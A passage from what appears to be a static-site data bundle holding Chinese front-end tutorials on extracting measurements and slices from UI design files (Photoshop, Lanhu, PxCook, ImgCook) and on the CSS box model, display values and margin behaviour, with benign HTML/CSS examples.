使用吸管点击目标后，会弹出拾色器的窗口（如果没弹出就手动点击下图里的红色圈），里面就有目标颜色的相关数值。\n   * \n\n文字相关信息可以在字符面板里进行查看：\n\n * 字符面板需要在窗口-字符里勾选上\n   * \n * 先使用移动工具选中文字目标（选中它的图层），就可以在字符面板里查看文字信息\n   * \n\n我们进行切图操作，需要先启用生成器，然后要勾选上图像资源，\n\n * 启用生成器在编辑-首选项-增效工具里，在增效工具面板里勾选启用生成器。\n   * \n   * \n * 然后需要在文件-生成-图像资源勾上这个图像资源。\n   * \n * 再选中目标，在图层里编辑名字改为xxx.png，就可以自动将目标图切下来。\n   * \n * 最后的图在当前PSD文件的同目录下。如果想获取“倍图”，可以在编辑名字时改为200% xxx.png。\n   * \n\n\n# 二、使用蓝湖快速标注信息\n\n蓝湖是一款设计图的共享平台，帮助互联网团队更好地管理设计图。自动生成设计图的标注，与团队共享设计图，展示页面之间的跳转关系。蓝湖支持从Sketch、Ps、Xd一键共享，在线讨论，蓝湖已经成为新一代产品设计的工作方式。与蓝湖类似的还有measure和zeplin。\n\n * 注册登录蓝湖，然后下载它在PS里的插件（目前只支持pscc2017以上版本）\n   * \n * 安装好插件后，重启Photoshop，然后在Photoshop的窗口-扩展功能就有刚刚安装好的插件\n   * \n * 在这个插件上登录自己的账号，然后会显示以下样式\n   * \n * 然后我们去蓝湖网站上新建一个项目\n   * \n * 返回Photoshop，打开蓝湖插件，选择刚刚新建的蓝湖项目（选不中就重启一下插件）。还有选择尺寸。\n   * \n * 回到蓝湖网站，刷新一下页面就能看到PSD等资源就上传到这里了\n   * \n * 在蓝湖里双击这个新传的资源，就进入到了详情页，可查看批注、也可直接保存切图、查看距离大小等信息，非常的方便。\n   * \n * 在这个页面也能看到文字、色彩等信息，例如下图的文字信息\n   * \n * 我们在详情页的右上角可以看到一个可以选择展示类型，web端、IOS、Android等。也能使用“像素”\n   * \n   * \n * 如果我们要进行切图，首先要在Photoshop这边，选定一个目标，再使用蓝湖插件对它进行标记，然后重新将这个PSD上传到蓝湖。\n   * \n * 然后返回蓝图网站，重新打开那个项目和那个文件，进入详情页，点击刚刚的目标，右侧面板就会出现“下载当前切图”，下载前能选择类型等。\n   * \n\n\n# 三、PxCook和ImgCook\n\nPxCook中文名“像素大厨”，是一款适合设计师们使用的、免费的、交互流畅以及全平台支持的标注切图软件。功能多样化且非常实用，操作上也很简单，它能够支持对Ps和Sketch设计元素尺寸、元素距离、文本样式与颜色的智能标注，并且还支持智能切图。像素大厨与蓝湖区别是，蓝湖是在线web平台，像素大厨可以在本地使用。PxCook与蓝湖在操作上大同小异，这里就不详细演示了。\n\nImgCook专注以Sketch、PSD、静态图片等形式的视觉稿作为输入，通过智能化技术一键生成可维护的前端代码，包含视图代码、数据字段绑定、组件代码、部分业务逻辑代码等。目前此产品是阿里巴巴前端委员会智能化小组的服务化的内外落地产品，对Sketch支持挺好的，暂时对PS支持一般般。\n\n * 我们进入ImgCook网站，点击最上方的“导入”，并选择将sketch页签，然后就可以导入Sketch文件了。\n   * \n * 选择一个图生成代码，生成代码成功后，就可以看左侧是代码结构，中间是图，右侧是左侧某个结构的属性\n   * \n * 设置完一些属性、数据、事件后，点击上方的“保存”（使用GitHub登录），再点击“代码”，就可以查看该图会生成一个什么形式的代码。\n   * \n * 再点击上方的“导出”就可以下载到这个代码了。当然，导出的代码只是一个最最最简单的样子，还是需要自己修改，只是参考它的一个分层。\n   * ",normalizedContent:"# 还原ui设计\n\nui设计师给前端开发人员提供了ui设计图，前端开发人员拿这个ui设计图进行精细的切图操作。切图过程中有尺寸测量、颜色吸取、字体大小测量等，需要使用比较专业的软件来辅助前端开发人员进行切图操作。\n\n\n# 一、photoshop还原ui设计\n\n将一个psd文件使用photoshop打开，在测量大小和距离时，可以选择矩形选框和信息面板进行配合：\n\n * 矩形选框在photoshop界面的左边工具栏第二个位置\n   * \n * 信息面板需要在窗口-信息里勾选上\n   * \n * 然后查看选项面板是否使用的是像素。\n   * \n   * \n * 我们使用矩形选框就可以测量距离了，距离数值会在信息面板里展示。如果需要微调选框，可以按住shift键并点击目标就可增大选框，可以按住alt键并点击目标就可减小选框。\n\n另一种测量大小和距离的方式是使用移动工具：\n\n * 移动工具在photoshop界面的左边工具栏第一个位置\n   * \n * 选择了移动工具，我们点击一个目标（选中了图层），然后按住ctrl键，移动鼠标悬停在另一个目标，就能测出它们之间的距离了。\n   * \n\n除了测距和大小，我们可以吸取颜色，获得颜色的数值：\n\n * 吸管在photoshop界面的左边工具栏第七个位置\n   * \n * 使用ctrl键+鼠标滚轮可以调整psd的显示位置，alt键+鼠标滚轮可以调整psd的显示大小。便于吸取颜色。\n * 使用吸管点击目标后，会弹出拾色器的窗口（如果没弹出就手动点击下图里的红色圈），里面就有目标颜色的相关数值。\n   * \n\n文字相关信息可以在字符面板里进行查看：\n\n * 字符面板需要在窗口-字符里勾选上\n   * \n * 先使用移动工具选中文字目标（选中它的图层），就可以在字符面板里查看文字信息\n   * \n\n我们进行切图操作，需要先启用生成器，然后要勾选上图像资源，\n\n * 启用生成器在编辑-首选项-增效工具里，在增效工具面板里勾选启用生成器。\n   * \n   * \n * 然后需要在文件-生成-图像资源勾上这个图像资源。\n   * \n * 再选中目标，在图层里编辑名字改为xxx.png，就可以自动将目标图切下来。\n   * \n * 最后的图在当前psd文件的同目录下。如果想获取“倍图”，可以在编辑名字时改为200% xxx.png。\n   * \n\n\n# 二、使用蓝湖快速标注信息\n\n蓝湖是一款设计图的共享平台，帮助互联网团队更好地管理设计图。自动生成设计图的标注，与团队共享设计图，展示页面之间的跳转关系。蓝湖支持从sketch、ps、xd一键共享，在线讨论，蓝湖已经成为新一代产品设计的工作方式。与蓝湖类似的还有measure和zeplin。\n\n * 注册登录蓝湖，然后下载它在ps里的插件（目前只支持pscc2017以上版本）\n   * \n * 安装好插件后，重启photoshop，然后在photoshop的窗口-扩展功能就有刚刚安装好的插件\n   * \n * 在这个插件上登录自己的账号，然后会显示以下样式\n   * \n * 然后我们去蓝湖网站上新建一个项目\n   * \n * 返回photoshop，打开蓝湖插件，选择刚刚新建的蓝湖项目（选不中就重启一下插件）。还有选择尺寸。\n   * \n * 回到蓝湖网站，刷新一下页面就能看到psd等资源就上传到这里了\n   * \n * 在蓝湖里双击这个新传的资源，就进入到了详情页，可查看批注、也可直接保存切图、查看距离大小等信息，非常的方便。\n   * \n * 在这个页面也能看到文字、色彩等信息，例如下图的文字信息\n   * \n * 我们在详情页的右上角可以看到一个可以选择展示类型，web端、ios、android等。也能使用“像素”\n   * \n   * \n * 如果我们要进行切图，首先要在photoshop这边，选定一个目标，再使用蓝湖插件对它进行标记，然后重新将这个psd上传到蓝湖。\n   * \n * 然后返回蓝图网站，重新打开那个项目和那个文件，进入详情页，点击刚刚的目标，右侧面板就会出现“下载当前切图”，下载前能选择类型等。\n   * \n\n\n# 三、pxcook和imgcook\n\npxcook中文名“像素大厨”，是一款适合设计师们使用的、免费的、交互流畅以及全平台支持的标注切图软件。功能多样化且非常实用，操作上也很简单，它能够支持对ps和sketch设计元素尺寸、元素距离、文本样式与颜色的智能标注，并且还支持智能切图。像素大厨与蓝湖区别是，蓝湖是在线web平台，像素大厨可以在本地使用。pxcook与蓝湖在操作上大同小异，这里就不详细演示了。\n\nimgcook专注以sketch、psd、静态图片等形式的视觉稿作为输入，通过智能化技术一键生成可维护的前端代码，包含视图代码、数据字段绑定、组件代码、部分业务逻辑代码等。目前此产品是阿里巴巴前端委员会智能化小组的服务化的内外落地产品，对sketch支持挺好的，暂时对ps支持一般般。\n\n * 我们进入imgcook网站，点击最上方的“导入”，并选择将sketch页签，然后就可以导入sketch文件了。\n   * \n * 选择一个图生成代码，生成代码成功后，就可以看左侧是代码结构，中间是图，右侧是左侧某个结构的属性\n   * \n * 设置完一些属性、数据、事件后，点击上方的“保存”（使用github登录），再点击“代码”，就可以查看该图会生成一个什么形式的代码。\n   * \n * 再点击上方的“导出”就可以下载到这个代码了。当然，导出的代码只是一个最最最简单的样子，还是需要自己修改，只是参考它的一个分层。\n   * ",charsets:{cjk:!0}},{title:"2.盒模型",frontmatter:{title:"2.盒模型"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/2.%E7%9B%92%E6%A8%A1%E5%9E%8B.html",relativePath:"book-web/html、css、js、ts/学习CSS/2.盒模型.md",key:"v-5b977d77",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/2.%E7%9B%92%E6%A8%A1%E5%9E%8B.html",headers:[{level:2,title:"一、盒子的构成与设置",slug:"一、盒子的构成与设置",normalizedTitle:"一、盒子的构成与设置",charIndex:10},{level:3,title:"1.1 盒子的构成",slug:"_1-1-盒子的构成",normalizedTitle:"1.1 盒子的构成",charIndex:25},{level:3,title:"1.2 盒子的相关设置",slug:"_1-2-盒子的相关设置",normalizedTitle:"1.2 盒子的相关设置",charIndex:370},{level:2,title:"二、块级盒子和内联盒子",slug:"二、块级盒子和内联盒子",normalizedTitle:"二、块级盒子和内联盒子",charIndex:1549},{level:2,title:"三、display的其他值",slug:"三、display的其他值",normalizedTitle:"三、display的其他值",charIndex:3342},{level:3,title:"3.1 none",slug:"_3-1-none",normalizedTitle:"3.1 none",charIndex:3360},{level:3,title:"3.2 inline-block",slug:"_3-2-inline-block",normalizedTitle:"3.2 inline-block",charIndex:3680},{level:3,title:"3.3 inline-table",slug:"_3-3-inline-table",normalizedTitle:"3.3 inline-table",charIndex:4570},{level:3,title:"3.4 list-item",slug:"_3-4-list-item",normalizedTitle:"3.4 list-item",charIndex:5116},{level:3,title:"3.5 run-in和compact",slug:"_3-5-run-in和compact",normalizedTitle:"3.5 run-in和compact",charIndex:5477},{level:2,title:"四、内外边距的影响",slug:"四、内外边距的影响",normalizedTitle:"四、内外边距的影响",charIndex:928},{level:3,title:"4.1 展示尺寸与布局尺寸",slug:"_4-1-展示尺寸与布局尺寸",normalizedTitle:"4.1 展示尺寸与布局尺寸",charIndex:5633},{level:3,title:"4.2 块级元素的隐藏等式",slug:"_4-2-块级元素的隐藏等式",normalizedTitle:"4.2 块级元素的隐藏等式",charIndex:8487},{level:3,title:"4.3 在内联元素上的表现",slug:"_4-3-在内联元素上的表现",normalizedTitle:"4.3 在内联元素上的表现",charIndex:10079},{level:3,title:"4.4 上下外边距折叠",slug:"_4-4-上下外边距折叠",normalizedTitle:"4.4 上下外边距折叠",charIndex:10658},{level:2,title:"五、内联元素的排列",slug:"五、内联元素的排列",normalizedTitle:"五、内联元素的排列",charIndex:16665},{level:3,title:"5.1 替换元素与非替换元素",slug:"_5-1-替换元素与非替换元素",normalizedTitle:"5.1 替换元素与非替换元素",charIndex:16864},{level:3,title:"5.2 inline box和line box",slug:"_5-2-inline-box和line-box",normalizedTitle:"5.2 inline box和line box",charIndex:17428},{level:3,title:"5.3 line-height和baseline",slug:"_5-3-line-height和baseline",normalizedTitle:"5.3 line-height和baseline",charIndex:19064},{level:3,title:"5.4 vertical-align",slug:"_5-4-vertical-align",normalizedTitle:"5.4 vertical-align",charIndex:20995},{level:3,title:"5.5 替换元素和内联块级的影响",slug:"_5-5-替换元素和内联块级的影响",normalizedTitle:"5.5 替换元素和内联块级的影响",charIndex:26835},{level:2,title:"六、溢出overflow",slug:"六、溢出overflow",normalizedTitle:"六、溢出overflow",charIndex:31497},{level:3,title:"6.1 visible",slug:"_6-1-visible",normalizedTitle:"6.1 visible",charIndex:31650},{level:3,title:"6.2 hidden",slug:"_6-2-hidden",normalizedTitle:"6.2 hidden",charIndex:31744},{level:3,title:"6.3 scroll",slug:"_6-3-scroll",normalizedTitle:"6.3 scroll",charIndex:33577},{level:3,title:"6.4 auto",slug:"_6-4-auto",normalizedTitle:"6.4 auto",charIndex:35470},{level:3,title:"6.5 text-overflow",slug:"_6-5-text-overflow",normalizedTitle:"6.5 text-overflow",charIndex:37049}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、盒子的构成与设置 1.1 盒子的构成 1.2 盒子的相关设置 二、块级盒子和内联盒子 三、display的其他值 3.1 none 3.2 inline-block 3.3 inline-table 3.4 list-item 3.5 run-in和compact 四、内外边距的影响 4.1 展示尺寸与布局尺寸 4.2 块级元素的隐藏等式 4.3 在内联元素上的表现 4.4 上下外边距折叠 五、内联元素的排列 5.1 替换元素与非替换元素 5.2 inline box和line box 5.3 line-height和baseline 5.4 vertical-align 5.5 替换元素和内联块级的影响 六、溢出overflow 6.1 visible 6.2 hidden 6.3 scroll 6.4 auto 6.5 text-overflow",content:'# 盒模型\n\n\n# 一、盒子的构成与设置\n\n\n# 1.1 盒子的构成\n\n在CSS中，所有元素都是一个“盒子（box）”结构，这个盒子有一个盒边框，在这个边框内部有个显示内容区域，显示内容与边框之间还会有填充（内边距），边框与其他盒子之间也有间距（外边距）。可以看下面这个盒模型图：\n\n\n\n解释：\n\n * content area: 这个区域是用来显示内容，大小可以通过设置 width 和 height。\n * padding area: 包围在内容区域外部的空白区域； 大小通过 padding 相关属性设置。\n * border area: 边框盒包裹内容和内边距。大小通过 border 相关属性设置。\n * margin area: 这是最外面的区域，是盒子和其他元素之间的空白区域。大小通过 margin 相关属性设置。\n\n\n# 1.2 盒子的相关设置\n\n标准盒模型的width和height其实就是contentArea的宽高，但是IE盒模型的width和height是contentArea、paddingArea以及borderArea这三者的和值，通过改变box-sizing: content-box（W3C）和box-sizing: border-box（IE）就可以达到自由切换的效果。\n\nmargin可以统一设置上下左右的外边距，比如margin: 0 10px 20px 30px意思就是上外边距是0、右外边距是10px、下外边距是20px、左外边距是30px。也可以margin: 0 10px上下外边距是0、左右外边距是10px。单独设置一边也可以的，比如margin-top:0; margin-right:10px; margin-bottom:20px; margin-left:30px;，\n\nborder可以统一设置也可以单独设置一边。主要注意的是它还有其他样式可以设置，比如颜色border-color、宽度border-width、线条类型border-style。\n\npadding也可以统一设置也可以单独设置一边。padding只能是非负数；而margin可以是负数，并且可能会影响到自身的位置以及大小，在四、内外边距的影响会详细说明。\n\n<html>\n<head>\n    <style type="text/css">\n        .container {\n          border-top: 5px dotted green;\n          border-right: 1px solid black;\n          border-bottom: 10px double blue;\n        }\n        .box {\n          border: 1px solid #333333;\n          border-top-style: dotted;\n          border-right-width: 20px;\n          border-bottom-color: red;\n          margin: 20px 20px;\n        }\n    </style>\n</head>\n<body>\n    <div class="container">\n      <div class="box">Change my borders.</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n上面代码的效果图：\n\n\n# 二、块级盒子和内联盒子\n\n在水平书写模式中，页面通常是从左到右、从上到下这样一个顺序来显示元素的（阿拉伯语言等除外），盒子也是基于这种正常的元素排列顺序来说的。\n\nCSS盒子最主要的两种盒子就是块级盒子（Block box）和内联盒子（Inline box），它们主要的区别就是在排列顺序上表现不一样。比如块级盒子主要是垂直排列（一个块级元素就默认占据一行），而内联盒子主要是水平排列（多个内联元素在一行里inline）。\n\n块级盒子会表现出以下行为:\n\n * 块级盒子默认会与父容器一样宽；\n * 每个块级盒子都会单独占一行，也就是说，不会有其他块级盒子和当前块级盒子在一行里；\n * width 和 height 属性可以发挥作用；\n * 内外边距和边框会将其他元素从当前盒子周围“推开”。\n\n内联盒子会表现出以下行为:\n\n * 内联盒子不会单独占一行，多个内联盒子可以在一行里（并且留了间隙，所以一般不用内联盒子）。\n * width 和 height 属性将不起作用，原因是它是由内部撑起来的。\n * 垂直方向的内外边距以及边框会被应用，虽然被应用了，但并不会推开上下的其他内联盒子（真要推开，也是靠行高来影响的）。\n * 水平方向的内外边距以及边框会被应用，并且会把左右的内联盒子推开。\n\n<html>\n<head>\n    <style type="text/css">\n        p {\n            width: 300px;\n            height: 150px;\n            border: 2px solid red;\n        }\n        span {\n            margin: 20px;   /* 外边距和边框虽然是生效的，垂直是推不开的其他内联元素的，而水平方向的可以 */\n            padding: 10px;  /* 生效 */\n            width: 30px;    /* 内联盒子忽略宽度 */\n            height: 10px;   /* 内联盒子忽略高度 */\n            background-color: lightblue;\n            border: 2px solid blue;\n        }\n    </style>\n</head>\n<body>\n    <p>\n        I am a paragraph and this is a <span>span</span> inside that paragraph. A span is an inline element and so does not respect width and height.\n    </p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n上面代码的效果图：\n\n\n除非特殊指定，<h1>、<p>和<div>等在默认情况下都是块级盒子，<span>、<a>、<em>和<strong>等在默认情况下都是内联盒子。可以通过display来指定或者修改元素的盒子类型。\n\n<html>\n<head>\n    <style type="text/css">\n        div { display: inline; background-color: red; }\n        span { display: block; background-color: green; }\n    </style>\n</head>\n<body>\n    <div>div元素</div>\x3c!--变成在一行里排列的内联元素--\x3e\n    <div>div元素</div>\x3c!--变成在一行里排列的内联元素--\x3e\n    <span>span元素</span>\x3c!--变成占满一行的块级元素--\x3e\n    <span>span元素</span>\x3c!--变成占满一行的块级元素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 三、display的其他值\n\n\n# 3.1 none\n\ndisplay: none一般用于隐藏元素。它所在位置会被其他元素占领，不会留出空白。\n\n<html>\n<head>\n    <style type="text/css">\n        .none { display: none; }\n    </style>\n</head>\n<body>\n    <div>示例文本1</div>\n    <div class="none">示例文本2</div>\n    <div class="none">示例文本3</div>\n    <div>示例文本4</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.2 inline-block\n\n希望元素在一行里排列，并且还能设置宽高（块级特点），但又不想它因为内外边距的原因导致与其他元素在垂直方向上重叠（上一节的span例子，内联特点），那么可以采用display: inline-block结合块级和内联两种方式的优点来使用。说简单点就是在一行里排列块级元素，并且垂直方向的内外边距能推开其他内容。\n\n<html>\n<head>\n    <style type="text/css">\n        p {\n            width: 300px;\n            height: 150px;\n            border: 2px solid red;\n        }\n        span {\n            display: inline-block;\n            margin: 20px;   /* 会推开文字 */\n            padding: 10px;\n            width: 30px;    /* 生效 */\n            height: 10px;   /* 生效 */\n            background-color: lightblue;\n            border: 2px solid blue;\n        }\n    </style>\n</head>\n<body>\n    <p>\n    I am a paragraph and this is a <span>span</span> inside that paragraph. A span is an inline element and so does not respect width and height.\n</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n上面代码的效果图：\n\n\n# 3.3 inline-table\n\ninline-table与inline-block是类似的，只不过它是单独针对于<table>的。table元素是属于block类型的，使用display: inline-table可以让table元素在行内排列。\n\n<html>\n<head>\n    <style type="text/css">\n        table {\n            border: 2px solid blue;\n            margin: 30px;\n            display: inline-table;\n        }\n        td { border: 2px solid red; }\n    </style>\n</head>\n<body>\n    你好\n    <table>\n        <tr><td>A</td><td>A</td><tr/>\n        <tr><td>B</td><td>C</td><tr/>\n    </table>\n    你好\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 3.4 list-item\n\ndisplay: list-item可以将多个元素作为列表来显示。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            display: list-item;\n            list-style-type: circle;\n            margin-left:30px;\n        }\n    </style>\n</head>\n<body>\n    <div>文本1</div>\n    <div>文本2</div>\n    <div>文本3</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 3.5 run-in和compact\n\ndisplay: run-in的元素将被包含在后面的block类型元素的内部，而display: compact的元素将被放置在block类型元素的左边。在css2.1被删除了，在css3恢复了但是很多浏览器没有实现，了解一下就行了。\n\n\n# 四、内外边距的影响\n\n\n# 4.1 展示尺寸与布局尺寸\n\n我们看待一个元素，要从两方面去分析它的，一个是视觉上，另一个就是布局上的。\n\n首先在视觉上，元素给我们呈现的视觉大小是由contentArea、paddingArea和borderArea决定的。比如给元素加上background-color，这个颜色所占区域就是contentArea、paddingArea、borderArea加起来的总区域。\n\n看下面这个例子，宽高其实都是100px的div，第一个加了margin，第二个加了padding，第三个加了padding和border，实际给我们呈现的效果除了content以外就只有padding和border还会影响视觉大小，而margin根本不会影响元素的视觉大小。我们暂且将元素在视觉上的展示大小称为元素的展示尺寸，它的值等于border + padding + content这个和值。（是不是想起IE盒的width和height）\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; }\n        .div1 { background-color: green; margin: 20px; }\n        .div2 { background-color: yellow; padding: 20px; }\n        .div3 { background-color: blue; padding: 20px; border: 2px solid red; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后在布局上，contentArea、paddingArea、borderArea和marginArea会决定元素在正常布局流中占据的空间大小。\n\n还是上面这个例子。三个div左右的外边距都是顶着父容器左右边框的，那么内容加上左右填充再加上左右边框最后加上左右外边距，这个值就等于父容器内容的宽度，也就说三个div盒子占据的空间宽度相同（这是一个伏笔）。而他们的占据的空间高度呢？同样也是如此，内容加上上下填充再加上上下边框最后加上上下外边距，在数值上几乎是一样的（除了第三个div有上下边框，浏览器F12查看）。我们暂且将元素在布局流中占据的空间大小称为元素的布局尺寸，它的值等于margin + border + padding + content这个和值。\n\n看下面这个例子，将第一个div的margin-bottom从20px慢慢改变到-20px。在改变过程中，你会发现后面两个div会慢慢往上挪动，形成一种步步紧逼的样子。这个现象其实就是因为第一个div占据的空间慢慢变小（布局尺寸减小），多出的空间被后面的div占据了。然后你还会发现展示效果一直是102×102的矩形区域，只不过会发生重叠，布局尺寸的减少并不会导致展示效果被压缩，也就说展示尺寸和布局尺寸之间没有强关联，只是数值上相差margin值而已。\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; border: 1px solid red; }\n        /* margin: 20px 20px 0 20px;中的第三个值从20px慢慢变到0再慢慢变到-20px */\n        .div1 { background-color: green; margin: 20px 20px 0 20px; }\n        .div2 { background-color: yellow; padding: 20px; opacity: 0.8; }\n        .div3 { background-color: blue; padding: 20px; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n还有一个比较有意思的点，改变布局尺寸，展示效果位移的可能是自己也可能是下一个元素。如果改变的是元素在排列方向上靠前的外边距，那展示效果位移的就是自己；如果改变的是排列方向上靠后的外边距，那展示效果位移的就是下一个元素。看下面这个例子，将第二个div的margin-top慢慢从0变为-40px，你会发现下面两个div在慢慢向上挪动。如果是margin-bottom，那就只有最后一个div移动。\n\nPS：排列方向，就是根据元素特性来排列（在正常布局流中），比如块级元素就是垂直方向（因为它们单独占一行，所以是进行上下的一个排列），内联元素就是水平方向。\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; border: 1px solid red; }\n        .div1 { background-color: green; margin: 20px; }\n        .div2 { background-color: yellow; margin-top: -40px; padding: 20px; opacity: 0.8; }\n        .div3 { background-color: blue; padding: 20px; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们一直没说内边距对布局尺寸的影响，其实很简单，就是内边距只能增大布局尺寸而不能减小布局尺寸，原因就是padding只能是正值。那么可以下结论了，内边距既能改变布局尺寸也能改变展示尺寸，而外边距一般只能改变布局尺寸。\n\n\n# 4.2 块级元素的隐藏等式\n\n你会看到上面的结论有“一般”这个词，因为有一种情况比较特殊，也是之前埋下的伏笔。块级元素在非排列方向上（也就是块级元素是水平方向上）的外边距，可能会影响到展示尺寸。\n\n因为块级元素有个特点，水平占据一行。什么意思呢？块级元素布局尺寸的宽度必须等于父元素内容的宽度，也就是这个等式margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right = the width of the parent element（准确来说是等于父容器内容的宽度，子元素水平方向的布局尺寸等于父元素的内容的宽度）。垂直方向是没有这个等式的，因为块级元素高度的auto是由本身内容决定的，块级元素宽度的auto是由父级宽度决定的。\n\n上一节的那些例子，父级元素宽度不变，子级元素有显示设置宽度、内边距以及边框，只需要左右外边距来补齐布局尺寸宽度即可。再看下面这个例子，没有设置子元素宽度（那就默认auto），并且让左右外边距取负值，要维持那个等式，那得让展示尺寸的宽度增大才行。当然左右外边距取正值也会影响到展示尺寸宽度（减小）。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer { width: 150px; height: 75px; border: 2px solid green; margin: 25px; }\n    /* 宽度没有设置或者为auto，左右外边距取负值。 */\n    .inner { height: 25px; border: 1px solid red; margin-left: -20px}\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n由于这个等式的关系，只要让子元素的左右内外边距固定不变，父元素宽度变大，那子元素宽度跟着变大（父变小那子也变小）；或者父元素宽度固定，让子元素的左右内外边距变大，那子元素的宽度反而会变小（边距变小那子就变大）。我们常把这种子元素叫做自适应的盒子。\n\n<html>\n<head>\n    <style>\n        .outer {\n            width: 200px;\n            height: 200px;\n            background-color: red;\n            margin: 50px 0 0 100px;\n        }\n        .inner {\n            height: 100px;\n            background-color: blue;\n            /* 子元素宽度由margin来决定（父元素width固定），还应用了外边距取负数 */\n            margin: 50px -150px 0 -50px;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 4.3 在内联元素上的表现\n\n前面两小节基本上说的是块级元素，讨论了块级元素在排列方向以及非排列方向上展示尺寸和布局尺寸的效果和作用。那么内联元素呢？\n\n内联元素在排列方向上（内联水平排列），跟块级元素在排列方向上（块级垂直排列）一样。展示尺寸和布局尺寸都是有效果作用也正常。\n\n但是内联元素在非排列方向上（也就是垂直方向），跟块级元素在非排列方向上（也就是水平方向）同样是受到限制的。展示尺寸没问题，该怎么展示就怎么展示，和块级元素在水平方向一样。只是布局尺寸就不一样，块级元素水平方向有一个关于布局尺寸的隐藏等式，内联元素垂直方向是没有这样的等式，而是有一个line box的限制。\n\nline box会限制相邻两行内联元素的内外边距影响，可以回想一下内联盒子的最后两条表现，上下左右的内外边距被应用，左右内外边距可以推开相邻内联盒子，而上下内外边距是推不开相邻内联盒子。\n\n其实内联元素具体是内联替换元素或者内联块级元素的时候，那布局尺寸的功能都开始生效了，不过还是相对于line box来说的，通过影响line box来间接影响到相邻两行。\n\n以上不明白的去看内联元素的排列，这里只是简单说一下。然后我们小节一下，在元素的“排列方向”上，展示尺寸和布局尺寸是正常工作的，在在元素的“非排列方向”上，展示尺寸仍正常工作，而布局尺寸会受到限制。\n\n\n# 4.4 上下外边距折叠\n\n在正常布局流中相邻块级元素的上下外边距有折叠。\n\n解释说明：\n\n * 正常布局流：块级盒子一般是垂直排列，内联盒子一般是水平排列，可以看后面的章节——正常布局流。\n * 相邻块级元素：也就是上下紧挨着的块级盒子（跟盒子大小无关，也肯定是各占一行）。\n * 上下外边距：其实是两个盒子之间相互靠近的外边距（各自出一个外边距）。\n * 折叠：取两个值中最大的那个作为最终值（同号，并且绝对值最大），那个小值会被忽略掉（可以理解为重叠）。与折叠相反的就是“累积”，意思是两个值相加。\n\n具体场景（第4个场景比较特殊）：\n\n 1. 两个相邻的块级盒子。它们之间的间隔当然只是上下的外边距起作用，如果两个相靠近的外边距同号（同时为正数或负数），那外边距是折叠的；而异号的话就是累积的。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .outer { display: inline-block; width: 150px; border: 2px solid green; padding: 25px; }\n        .inner { display: block; width: 150px; height: 75px; }\n        .left1 { margin-bottom: 10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right1 { margin-top: 10px; border: 1px solid blue; }\n        .left2 { margin-bottom: -10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right2 { margin-top: 10px; border: 1px solid blue; }\n        .left3 { margin-bottom: -10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right3 { margin-top: -10px; border: 1px solid blue; }\n        </style>\n    </head>\n    <body>\n        <div class="outer">\n            <div class="inner left1"></div>\n            <div class="inner right1"></div>\n        </div>\n        <div class="outer">\n            <div class="inner left2"></div>\n            <div class="inner right2"></div>\n        </div>\n        <div class="outer">\n            <div class="inner left3"></div>\n            <div class="inner right3"></div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 2. 